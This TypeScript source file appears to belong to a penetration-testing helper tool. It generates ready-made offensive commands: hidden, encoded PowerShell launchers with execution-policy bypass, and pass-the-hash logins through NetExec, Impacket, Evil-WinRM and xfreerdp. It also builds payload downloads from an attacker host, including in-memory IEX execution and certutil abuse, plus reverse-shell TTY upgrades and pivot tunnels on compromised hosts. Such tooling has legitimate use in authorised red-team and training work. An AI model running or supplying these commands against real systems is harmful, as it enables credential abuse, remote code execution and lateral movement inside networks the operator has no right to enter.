/**
 * offensiveForgeUtils.ts
 * Tactical Offensive Payload Crafter, Authentication Flag Builder,
 * File Transfer Suite, Shell Stabilization, and Network Pivoting Matrix.
 * 100% Client-Side, Deterministic, and Offline-First.
 */

import { isNtlmHash } from './hashIdentifier';

export interface AuthFlagCommandResult {
  tool: 'netexec' | 'impacket' | 'evil-winrm' | 'xfreerdp';
  isPassTheHash: boolean;
  command: string;
  explanation: string;
}

export interface FileTransferCommandResult {
  category: 'attacker-server' | 'linux-download' | 'windows-download';
  method: string;
  command: string;
  notes?: string;
}

export interface TtyStabilizationStep {
  step: number;
  instruction: string;
  command: string;
}

export interface PivotingCommandResult {
  tool: 'ligolo-ng' | 'chisel' | 'ssh' | 'netsh';
  mode: string;
  command: string;
  role: 'attacker' | 'pivot-host' | 'client';
  description: string;
}

/**
 * Encodes an arbitrary PowerShell command to UTF-16LE Base64 format for -EncodedCommand.
 * Implements call-stack safe chunking to prevent RangeError on large scripts.
 */
export function encodePowerShellCommand(command: string): string {
  if (!command) return '';
  const utf16Bytes: number[] = [];
  for (let i = 0; i < command.length; i++) {
    const code = command.charCodeAt(i);
    utf16Bytes.push(code & 0xff);
    utf16Bytes.push((code >> 8) & 0xff);
  }

  let binaryStr = '';
  const chunkSize = 8192;
  for (let i = 0; i < utf16Bytes.length; i += chunkSize) {
    const chunk = utf16Bytes.slice(i, i + chunkSize);
    binaryStr += String.fromCharCode.apply(null, chunk);
  }

  if (typeof btoa === 'function') {
    return btoa(binaryStr);
  } else if (typeof Buffer !== 'undefined') {
    return Buffer.from(binaryStr, 'binary').toString('base64');
  }
  return '';
}

/**
 * Decodes a UTF-16LE Base64 PowerShell EncodedCommand back into plaintext string.
 */
export function decodePowerShellCommand(base64Str: string): string {
  if (!base64Str) return '';
  try {
    let binary = '';
    if (typeof atob === 'function') {
      binary = atob(base64Str.trim());
    } else if (typeof Buffer !== 'undefined') {
      binary = Buffer.from(base64Str.trim(), 'base64').toString('binary');
    }

    const chars: string[] = [];
    for (let i = 0; i < binary.length; i += 2) {
      const code = binary.charCodeAt(i) | (binary.charCodeAt(i + 1) << 8);
      chars.push(String.fromCharCode(code));
    }
    return chars.join('');
  } catch {
    return '';
  }
}

/**
 * Generates an obfuscated one-liner execution wrapper for PowerShell.
 */
export function buildPowerShellEncodedExecution(command: string): string {
  const b64 = encodePowerShellCommand(command);
  return `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${b64}`;
}

/**
 * Smart Authentication Flag Builder.
 * Automatically detects whether credentials are a plaintext password or an NTLM Hash,
 * generating exact Pass-The-Hash or Password authentication flags across key tools.
 */
export function buildToolAuthCommand(
  tool: 'netexec' | 'impacket' | 'evil-winrm' | 'xfreerdp',
  targetIp: string,
  username: string,
  passwordOrHash: string,
  domain?: string,
  options: {
    protocol?: 'smb' | 'winrm' | 'ldap' | 'mssql';
    impacketBinary?: 'wmiexec' | 'psexec' | 'smbclient' | 'secretsdump';
  } = {}
): AuthFlagCommandResult {
  const isPth = isNtlmHash(passwordOrHash);
  const user = username || 'Administrator';
  const ip = targetIp || '10.10.10.x';
  const dom = domain ? domain.trim() : '';

  switch (tool) {
    case 'netexec': {
      const proto = options.protocol || 'smb';
      const domFlag = dom ? ` -d '${dom}'` : '';
      if (isPth) {
        return {
          tool: 'netexec',
          isPassTheHash: true,
          command: `nxc ${proto} ${ip} -u '${user}' -H '${passwordOrHash}'${domFlag}`,
          explanation: `Pass-The-Hash authentication using 32-character NTLM hash with NetExec ${proto.toUpperCase()}.`,
        };
      }
      return {
        tool: 'netexec',
        isPassTheHash: false,
        command: `nxc ${proto} ${ip} -u '${user}' -p '${passwordOrHash}'${domFlag}`,
        explanation: `Standard plaintext password authentication with NetExec ${proto.toUpperCase()}.`,
      };
    }

    case 'impacket': {
      const bin = options.impacketBinary || 'wmiexec';
      const userPrefix = dom ? `${dom}/${user}` : user;
      if (isPth) {
        return {
          tool: 'impacket',
          isPassTheHash: true,
          command: `impacket-${bin} -hashes ':${passwordOrHash}' '${userPrefix}@${ip}'`,
          explanation: `Pass-The-Hash via Impacket ${bin} using -hashes :<NTLM> (empty LM component).`,
        };
      }
      return {
        tool: 'impacket',
        isPassTheHash: false,
        command: `impacket-${bin} '${userPrefix}:${passwordOrHash}@${ip}'`,
        explanation: `Standard plaintext authentication via Impacket ${bin}.`,
      };
    }

    case 'evil-winrm': {
      if (isPth) {
        return {
          tool: 'evil-winrm',
          isPassTheHash: true,
          command: `evil-winrm -i ${ip} -u '${user}' -H ${passwordOrHash}`,
          explanation: 'Pass-The-Hash via Evil-WinRM using -H flag for remote PowerShell session.',
        };
      }
      return {
        tool: 'evil-winrm',
        isPassTheHash: false,
        command: `evil-winrm -i ${ip} -u '${user}' -p '${passwordOrHash}'`,
        explanation: 'Plaintext password authentication via Evil-WinRM.',
      };
    }

    case 'xfreerdp': {
      const domFlag = dom ? ` /d:${dom}` : '';
      if (isPth) {
        return {
          tool: 'xfreerdp',
          isPassTheHash: true,
          command: `xfreerdp /v:${ip} /u:${user} /pth:${passwordOrHash}${domFlag} +clipboard /dynamic-resolution`,
          explanation: 'Restricted Admin Mode / Pass-The-Hash RDP session via xfreerdp /pth.',
        };
      }
      return {
        tool: 'xfreerdp',
        isPassTheHash: false,
        command: `xfreerdp /v:${ip} /u:${user} /p:'${passwordOrHash}'${domFlag} +clipboard /dynamic-resolution`,
        explanation: 'Interactive graphical RDP session with plaintext password.',
      };
    }
  }
}

/**
 * File Transfer Command Generator.
 * Generates ready-to-run file transfer listeners on the attacker side
 * and download commands across Linux and Windows targets.
 */
export function generateFileTransferCommands(
  lhost: string = '10.10.14.x',
  lport: number = 80,
  filename: string = 'winpeas.exe',
  shareName: string = 'share'
): FileTransferCommandResult[] {
  return [
    // 1. Attacker Web & SMB Servers
    {
      category: 'attacker-server',
      method: 'Python 3 HTTP Server',
      command: `python3 -m http.server ${lport}`,
      notes: 'Lightweight static file server hosting current working directory.',
    },
    {
      category: 'attacker-server',
      method: 'Impacket SMB Server (SMB2)',
      command: `impacket-smbserver ${shareName} $(pwd) -smb2support`,
      notes: 'Bypasses modern Windows SMBv1 restrictions with -smb2support.',
    },
    {
      category: 'attacker-server',
      method: 'PHP Built-in Server',
      command: `php -S 0.0.0.0:${lport}`,
      notes: 'Alternative HTTP server if Python is unavailable.',
    },

    // 2. Linux Target Download Methods
    {
      category: 'linux-download',
      method: 'cURL',
      command: `curl -s http://${lhost}:${lport}/${filename} -o ${filename}`,
      notes: 'Silent download directly to current directory.',
    },
    {
      category: 'linux-download',
      method: 'Wget',
      command: `wget http://${lhost}:${lport}/${filename} -O ${filename}`,
      notes: 'Standard wget binary download.',
    },
    {
      category: 'linux-download',
      method: 'Python 3 urllib',
      command: `python3 -c "import urllib.request; urllib.request.urlretrieve('http://${lhost}:${lport}/${filename}', '${filename}')"`,
      notes: 'Living-off-the-land download when curl/wget are missing.',
    },
    {
      category: 'linux-download',
      method: 'Bash /dev/tcp Native Stream',
      command: `bash -c 'cat < /dev/tcp/${lhost}/${lport} > ${filename}'`,
      notes: 'Pure bash socket stream requiring netcat sender.',
    },

    // 3. Windows Target Download Methods
    {
      category: 'windows-download',
      method: 'Certutil.exe (URL Cache)',
      command: `certutil.exe -urlcache -split -f http://${lhost}:${lport}/${filename} ${filename}`,
      notes: 'Standard built-in Windows certificate management utility abuse.',
    },
    {
      category: 'windows-download',
      method: 'PowerShell Invoke-WebRequest (iwr)',
      command: `powershell -c "iwr -Uri http://${lhost}:${lport}/${filename} -OutFile ${filename}"`,
      notes: 'Built-in PowerShell 3.0+ cmdlet.',
    },
    {
      category: 'windows-download',
      method: 'PowerShell WebClient (DownloadFile)',
      command: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${lhost}:${lport}/${filename}', '${filename}')"`,
      notes: 'Compatible with legacy PowerShell 2.0+ without modern cmdlets.',
    },
    {
      category: 'windows-download',
      method: 'PowerShell In-Memory Execution (IEX)',
      command: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/${filename}')"`,
      notes: 'Executes script directly in RAM without writing to disk.',
    },
    {
      category: 'windows-download',
      method: 'BitsAdmin Background Job',
      command: `bitsadmin /transfer job /download /priority high http://${lhost}:${lport}/${filename} %TEMP%\\${filename}`,
      notes: 'Windows Background Intelligent Transfer Service download.',
    },
    {
      category: 'windows-download',
      method: 'SMB Direct Copy',
      command: `copy \\\\${lhost}\\${shareName}\\${filename} ${filename}`,
      notes: 'Direct unauthenticated file copy from impacket-smbserver.',
    },
  ];
}

/**
 * Shell Stabilization Step Sequence.
 * Full interactive TTY upgrade sequence from a raw netcat reverse shell.
 */
export function getTtyStabilizationSteps(rows: number = 38, cols: number = 116): TtyStabilizationStep[] {
  return [
    {
      step: 1,
      instruction: 'Spawn pseudo-terminal in remote shell using Python',
      command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    },
    {
      step: 2,
      instruction: 'Background remote shell to local terminal',
      command: `[Press Ctrl + Z]`,
    },
    {
      step: 3,
      instruction: 'Set raw terminal input and disable local echo, then bring shell to foreground',
      command: `stty raw -echo; fg`,
    },
    {
      step: 4,
      instruction: 'Reinitialize terminal and set proper TERM variable',
      command: `reset; export TERM=xterm-256color`,
    },
    {
      step: 5,
      instruction: 'Synchronize terminal dimensions with your local display',
      command: `stty rows ${rows} columns ${cols}`,
    },
  ];
}

/**
 * Pivoting & Network Tunneling Command Generator.
 * Generates commands for Ligolo-ng, Chisel, SSH (Dynamic/Local/Remote/Sshuttle), and Windows Netsh.
 */
export function generatePivotingCommands(
  lhost: string = '10.10.14.x',
  targetSubnet: string = '172.16.1.0/24',
  pivotIp: string = '10.10.10.100',
  localPort: number = 8000,
  remotePort: number = 8080,
  targetHost: string = '172.16.1.5',
  targetPort: number = 80
): PivotingCommandResult[] {
  return [
    // 1. Ligolo-ng
    {
      tool: 'ligolo-ng',
      mode: 'TUN Interface Setup (Attacker)',
      role: 'attacker',
      command: `sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up`,
      description: 'Creates the virtual TUN interface on the attacker machine for Ligolo-ng routing.',
    },
    {
      tool: 'ligolo-ng',
      mode: 'Proxy Server Listener (Attacker)',
      role: 'attacker',
      command: `./proxy -selfcert -laddr 0.0.0.0:11601`,
      description: 'Starts the Ligolo-ng proxy listener waiting for incoming reverse agent connections.',
    },
    {
      tool: 'ligolo-ng',
      mode: 'Agent Connect (Pivot Target)',
      role: 'pivot-host',
      command: `./agent -connect ${lhost}:11601 -ignore-cert`,
      description: 'Connects back from compromised pivot host to attacker Ligolo proxy.',
    },
    {
      tool: 'ligolo-ng',
      mode: 'Route Subnet (Attacker)',
      role: 'attacker',
      command: `sudo ip route add ${targetSubnet} dev ligolo`,
      description: `Routes internal target subnet through Ligolo TUN interface for seamless nmap/browser access.`,
    },

    // 2. Chisel
    {
      tool: 'chisel',
      mode: 'Reverse Chisel Server (Attacker)',
      role: 'attacker',
      command: `./chisel server -p ${localPort} --reverse`,
      description: 'Attacker server listening for reverse port forward or SOCKS connections.',
    },
    {
      tool: 'chisel',
      mode: 'Reverse SOCKS5 Proxy (Pivot Target)',
      role: 'pivot-host',
      command: `./chisel client ${lhost}:${localPort} R:1080:socks`,
      description: 'Establishes reverse SOCKS5 proxy on attacker port 1080 (usable with proxychains).',
    },
    {
      tool: 'chisel',
      mode: 'Remote Port Forward (Pivot Target)',
      role: 'pivot-host',
      command: `./chisel client ${lhost}:${localPort} R:${remotePort}:${targetHost}:${targetPort}`,
      description: `Forwards internal service ${targetHost}:${targetPort} back to attacker port ${remotePort}.`,
    },

    // 3. SSH Tunneling
    {
      tool: 'ssh',
      mode: 'Dynamic SOCKS Proxy (-D)',
      role: 'attacker',
      command: `ssh -N -D 1080 user@${pivotIp}`,
      description: 'Creates local SOCKS5 proxy on port 1080 pivoting all traffic through SSH session.',
    },
    {
      tool: 'ssh',
      mode: 'Local Port Forward (-L)',
      role: 'attacker',
      command: `ssh -N -L ${localPort}:${targetHost}:${targetPort} user@${pivotIp}`,
      description: `Forwards local port ${localPort} directly to internal target ${targetHost}:${targetPort}.`,
    },
    {
      tool: 'ssh',
      mode: 'Remote Reverse Port Forward (-R)',
      role: 'pivot-host',
      command: `ssh -N -R ${remotePort}:127.0.0.1:${targetPort} attacker@${lhost}`,
      description: `Forwards pivot host local port ${targetPort} back to attacker port ${remotePort}.`,
    },
    {
      tool: 'ssh',
      mode: 'Sshuttle VPN-like Pivot',
      role: 'attacker',
      command: `sshuttle -r user@${pivotIp} ${targetSubnet}`,
      description: 'Transparently routes entire internal subnet via SSH without needing SOCKS configuration.',
    },

    // 4. Windows Netsh Portproxy
    {
      tool: 'netsh',
      mode: 'Add Port Forward (Windows Pivot)',
      role: 'pivot-host',
      command: `netsh interface portproxy add v4tov4 listenport=${localPort} listenaddress=0.0.0.0 connectport=${targetPort} connectaddress=${targetHost}`,
      description: `Windows native port relay: forwards incoming traffic on ${localPort} to ${targetHost}:${targetPort}.`,
    },
    {
      tool: 'netsh',
      mode: 'Verify Port Forwards (Windows Pivot)',
      role: 'pivot-host',
      command: `netsh interface portproxy show all`,
      description: 'Lists all active Windows portproxy forwarding rules.',
    },
    {
      tool: 'netsh',
      mode: 'Delete Port Forward (Windows Pivot)',
      role: 'pivot-host',
      command: `netsh interface portproxy delete v4tov4 listenport=${localPort} listenaddress=0.0.0.0`,
      description: 'Cleans up portproxy rule after engagement.',
    },
  ];
}
